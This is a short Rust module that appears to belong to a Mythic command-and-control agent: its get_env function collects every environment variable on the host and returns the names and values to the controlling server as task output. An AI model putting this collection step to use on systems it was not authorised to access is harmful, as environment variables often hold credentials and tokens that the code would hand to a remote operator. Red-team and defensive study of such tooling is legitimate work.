use serde::Serialize;

use crate::agent::AgentTask;
use crate::mythic_success;

#[derive(Serialize)]
struct EnvPair {
    key: String,
    value: String,
}

/// Gets a list of the current environment variables
/// * `task` - Task information
pub fn get_env(task: &AgentTask) -> std::io::Result<serde_json::Value> {
    let mut user_output: Vec<EnvPair> = Vec::new();
    // Iterate over each environment variable and add it to the output string
    for (key, value) in std::env::vars() {
        user_output.push(EnvPair { key, value });
    }

    let user_output = serde_json::to_string(&user_output)?;

    // Return the output to Mythic
    Ok(mythic_success!(task.id, user_output))
}
